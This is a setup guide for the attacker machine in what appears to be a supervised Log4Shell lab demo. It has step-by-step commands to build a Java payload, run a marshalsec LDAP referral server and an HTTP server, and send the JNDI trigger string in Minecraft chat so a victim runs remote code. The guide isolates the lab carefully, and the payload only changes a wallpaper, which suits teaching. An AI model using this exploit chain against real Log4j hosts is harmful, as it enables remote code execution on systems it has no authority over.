# Attacker VM Setup

The attacker VM is the operator's laptop/terminal. It runs:

- a real LDAP referral server (marshalsec) on `:1389`,
- an HTTP server on `:8000` for the Java class + wallpaper,
- the minimal Minecraft chat sender.

It does **not** need Minecraft, a Microsoft account, or a GPU.

---

## 1. VM

- Ubuntu 22.04/24.04 or Kali, 2 vCPU, 2 GB RAM, 10 GB disk.
- Host-only/private network, static `10.10.10.10/24`.
- No NAT/bridged adapter during the demo.
- Snapshot after everything works.

---

## 2. Packages

```bash
sudo apt update
sudo apt install -y python3 openjdk-17-jdk curl netcat-openbsd
```

Java 17 is fine for marshalsec. (The victim still needs Java 8 for Minecraft.)
If you prefer Java 8 on the attacker, that also works.

Check:

```bash
python3 --version
java -version
```

---

## 3. Copy the kit

Copy the whole `openhouse/` folder to the attacker VM, or at least:

```
attacker/
  build-payload.sh
  run-demo.sh
  chat-send.py
  vendor/marshalsec-0.0.3-SNAPSHOT-all.jar
assets/ehax-wallpaper.png
payload/WallpaperPayload.java
```

If you copy only `attacker/`, make sure `assets/` and `payload/` are present
relative to it, because the build script uses them.

---

## 4. Build once (needs internet)

```bash
cd attacker
./build-payload.sh
```

This:

- compiles `WallpaperPayload.java` for Java 8,
- copies all generated class files (including the inner class) into `serve/`,
- copies the wallpaper into `serve/`,
- downloads the prebuilt marshalsec jar if missing.

Expected output includes `WallpaperPayload.class` and
`ehax-wallpaper.png` in `attacker/serve/`.

After this, the attacker VM can be offline. The jar and class are local.

---

## 5. Firewall

Allow only the lab subnet:

```bash
sudo ufw allow from 10.10.10.0/24 to any port 1389 proto tcp
sudo ufw allow from 10.10.10.0/24 to any port 8000 proto tcp
```

Do not expose these ports to the internet. If `ufw` is not used, make sure the
host-only adapter is the only path to the VM.

---

## 6. Smoke test

Start the servers without sending chat:

```bash
./run-demo.sh --ip 10.10.10.10 --victim 10.10.10.20 --no-chat
```

In another terminal:

```bash
curl -sI http://10.10.10.10:8000/WallpaperPayload.class | head -1
curl -sI http://10.10.10.10:8000/ehax-wallpaper.png | head -1
nc -vz 10.10.10.10 1389
```

Expected: two `HTTP/1.0 200 OK` lines and a successful port check.

Stop with `Ctrl-C` when done.

---

## 7. Full run

Victim server must be running and the desktop visible. Then:

```bash
./run-demo.sh --ip 10.10.10.10 --victim 10.10.10.20
```

The script copies the trigger to the clipboard (macOS/Wayland/X11 if available)
and prompts:

```
Trigger for this station:
  ${jndi:ldap://10.10.10.10:1389/a}
Press Enter to send the trigger, or type another chat message.
>
```

Press Enter to send the trigger. After 1–3 seconds the victim wallpaper should
change. The script asks whether to send another; use `n` when the batch is done.

For automation (no prompt):

```bash
./run-demo.sh --ip 10.10.10.10 --victim 10.10.10.20 \
  --message '${jndi:ldap://10.10.10.10:1389/a}'
```

The script keeps the servers up after sending; `Ctrl-C` stops them.

---

## 8. Logs

```bash
tail -f logs/ldap.log
tail -f logs/http.log
```

Expected LDAP line after a trigger:

```
Send LDAP reference result for a redirecting to http://10.10.10.10:8000/WallpaperPayload.class
```

Expected HTTP lines:

```
GET /WallpaperPayload.class
GET /ehax-wallpaper.png
```

If those appear but the wallpaper doesn't change, the problem is on the victim
desktop session, not the attacker.

---

## 9. Notes

- `run-demo.sh` uses marshalsec, not netcat. Netcat cannot speak LDAP.
- The trigger is generated from `--ip` and `--ldap-port`; don't hand-edit half
  the string.
- If `pbcopy`/`xclip` is unavailable, the kid can simply press Enter; the default
  message is the trigger.
- If you change the wallpaper or payload, rerun `./build-payload.sh`. If the
  victim JVM caches the old class, restart the victim server.
- Do not connect the attacker VM to the internet while the demo servers are
  running with a vulnerable victim on the same network. Keep it host-only.
